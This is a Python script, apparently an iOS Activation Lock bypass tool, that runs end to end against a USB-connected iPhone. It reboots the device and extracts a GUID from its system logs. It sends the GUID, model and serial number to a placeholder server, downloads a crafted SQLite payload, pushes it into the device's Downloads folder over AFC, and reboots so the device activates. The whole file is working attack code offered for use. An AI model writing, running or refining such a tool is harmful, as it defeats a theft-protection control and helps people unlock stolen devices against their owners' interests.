#!/usr/bin/env python3
"""
iOS Activation Tool - Cross-Platform Edition
Supports macOS and Linux
"""
import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import atexit
import platform
from pathlib import Path

class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'

class BypassAutomation:
    def __init__(self):
        # --- CONFIGURATION ---
        # REPLACE THIS URL with your actual domain after deploying the server
        self.api_url = "https://your-domain.com/index.php"

        self.timeouts = {'asset_wait': 300, 'asset_delete_delay': 15, 'reboot_wait': 300, 'syslog_collect': 180}
        self.mount_point = Path.home() / f".ifuse_mount_{os.getpid()}"
        self.afc_mode = None
        self.device_info = {}
        self.guid = None
        self.platform = platform.system().lower()  # 'darwin' for macOS, 'linux' for Linux
        atexit.register(self._cleanup)

    def clear_screen(self):
        """Cross-platform screen clear"""
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')

    def log(self, msg, level='info'):
        if level == 'info': print(f"{Style.GREEN}[✓]{Style.RESET} {msg}")
        elif level == 'error': print(f"{Style.RED}[✗]{Style.RESET} {msg}")
        elif level == 'warn': print(f"{Style.YELLOW}[⚠]{Style.RESET} {msg}")
        elif level == 'step':
            print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
            print(f"{Style.BOLD}{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}")
            print(f"{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
        elif level == 'detail': print(f"{Style.DIM}  ╰─▶{Style.RESET} {msg}")
        elif level == 'success': print(f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}")

    def _run_cmd(self, cmd, timeout=None):
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return res.returncode, res.stdout.strip(), res.stderr.strip()
        except subprocess.TimeoutExpired: return 124, "", "Timeout"
        except Exception as e: return 1, "", str(e)

    def verify_dependencies(self):
        self.log("Verifying System Requirements...", "step")
        self.log(f"Platform: {self.platform}", "detail")

        # Check for required tools
        required = ["pymobiledevice3", "ideviceinfo"]
        for tool in required:
            if not shutil.which(tool):
                self.log(f"Missing required tool: {tool}", "error")
                sys.exit(1)

        if shutil.which("ifuse"):
            self.afc_mode = "ifuse"
        else:
            self.afc_mode = "pymobiledevice3"
        self.log(f"AFC Transfer Mode: {self.afc_mode}", "info")

    def mount_afc(self):
        if self.afc_mode != "ifuse": return True
        self.mount_point.mkdir(parents=True, exist_ok=True)
        code, out, _ = self._run_cmd(["mount"])
        if str(self.mount_point) in out: return True
        for i in range(5):
            if self._run_cmd(["ifuse", str(self.mount_point)])[0] == 0: return True
            time.sleep(2)
        return False

    def unmount_afc(self):
        if self.afc_mode == "ifuse" and self.mount_point.exists():
            self._run_cmd(["umount", str(self.mount_point)])
            try: self.mount_point.rmdir()
            except: pass

    def detect_device(self):
        self.log("Detecting Device...", "step")
        code, out, _ = self._run_cmd(["ideviceinfo"])
        if code != 0:
            self.log("No device found via USB", "error")
            sys.exit(1)

        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        self.device_info = info

        print(f"\n{Style.BOLD}Device: {info.get('ProductType','Unknown')} (iOS {info.get('ProductVersion','?')}){Style.RESET}")
        print(f"UDID: {info.get('UniqueDeviceID','?')}")

        if info.get('ActivationState') == 'Activated':
            print(f"{Style.YELLOW}Warning: Device already activated.{Style.RESET}")

    def get_guid_macos(self, log_path):
        """macOS-specific: Use /usr/bin/log to parse logarchive"""
        tmp = Path("final.logarchive")
        if tmp.exists(): shutil.rmtree(tmp)
        shutil.move(log_path, tmp)
        _, logs, _ = self._run_cmd(["/usr/bin/log", "show", "--style", "syslog", "--archive", str(tmp)])
        shutil.rmtree(tmp)
        return logs

    def get_guid_linux(self):
        """Linux-specific: Use live syslog watch to capture GUID"""
        self.log("Using live syslog watch (Linux mode)...", "detail")

        # Use pymobiledevice3 syslog watch with timeout
        # We'll capture output and search for GUID in real-time
        try:
            proc = subprocess.Popen(
                ["pymobiledevice3", "syslog", "live"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            guid_pattern = re.compile(r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/')
            start_time = time.time()
            timeout = self.timeouts['syslog_collect']

            self.log(f"Watching syslog for up to {timeout}s...", "detail")

            while time.time() - start_time < timeout:
                line = proc.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                if "BLDatabaseManager" in line:
                    match = guid_pattern.search(line)
                    if match:
                        proc.terminate()
                        return match.group(1).upper()

            proc.terminate()
            return None

        except Exception as e:
            self.log(f"Syslog watch error: {e}", "warn")
            return None

    def get_guid(self):
        self.log("Extracting System Logs...", "step")
        udid = self.device_info['UniqueDeviceID']
        log_path = Path(f"{udid}.logarchive")
        if log_path.exists(): shutil.rmtree(log_path)

        guid_pattern = re.compile(r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/')

        # Try collect method first (works on macOS with /usr/bin/log)
        if self.platform == 'darwin':
            self._run_cmd(["pymobiledevice3", "syslog", "collect", str(log_path)], timeout=180)

            if log_path.exists():
                logs = self.get_guid_macos(log_path)
                for line in logs.splitlines():
                    if "BLDatabaseManager" in line:
                        match = guid_pattern.search(line)
                        if match: return match.group(1).upper()

            # Fallback to live watch
            self.log("Archive parse failed, trying live watch...", "warn")

        # Linux or macOS fallback: use live syslog watch
        return self.get_guid_linux()

    def run(self):
        self.clear_screen()
        print(f"{Style.BOLD}{Style.MAGENTA}iOS Activation Tool - Cross-Platform Edition{Style.RESET}")
        print(f"{Style.DIM}Platform: {self.platform}{Style.RESET}\n")

        self.verify_dependencies()
        self.detect_device()

        input(f"{Style.YELLOW}Press Enter to start...{Style.RESET}")

        # 1. Reboot
        self.log("Rebooting device...", "step")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
        time.sleep(30)

        # 2. Get GUID
        self.guid = self.get_guid()
        if not self.guid:
            self.log("Could not find GUID in logs.", "error")
            sys.exit(1)
        self.log(f"GUID: {self.guid}", "success")

        # 3. API Call
        self.log("Requesting Payload...", "step")
        params = f"prd={self.device_info['ProductType']}&guid={self.guid}&sn={self.device_info['SerialNumber']}"
        url = f"{self.api_url}?{params}"

        _, out, _ = self._run_cmd(["curl", "-s", url])
        if not out.startswith("http"):
            self.log(f"Server Error: {out}", "error")
            sys.exit(1)

        # 4. Download & Deploy
        download_url = out.strip()
        local_db = Path("downloads.28.sqlitedb")
        if local_db.exists(): local_db.unlink()

        self._run_cmd(["curl", "-L", "-o", str(local_db), download_url])

        conn = sqlite3.connect(str(local_db))
        try:
            res = conn.execute("SELECT count(*) FROM sqlite_master WHERE type='table' AND name='asset'")
            if res.fetchone()[0] == 0: raise Exception("Invalid DB")
        except:
            self.log("Invalid payload received.", "error")
            sys.exit(1)
        conn.close()

        # 5. Upload
        self.log("Uploading...", "step")
        target = "/Downloads/downloads.28.sqlitedb"

        if self.afc_mode == "ifuse":
            self.mount_afc()
            fpath = self.mount_point / "Downloads" / "downloads.28.sqlitedb"
            if fpath.exists(): fpath.unlink()
            shutil.copy(str(local_db), str(fpath))
        else:
            self._run_cmd(["pymobiledevice3", "afc", "rm", target])
            self._run_cmd(["pymobiledevice3", "afc", "push", str(local_db), target])

        self.log("Payload Deployed. Rebooting...", "success")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])

        print(f"\n{Style.GREEN}Process Complete. Device should activate after reboot.{Style.RESET}")
        self._cleanup()

    def _cleanup(self): self.unmount_afc()

if __name__ == "__main__":
    BypassAutomation().run()
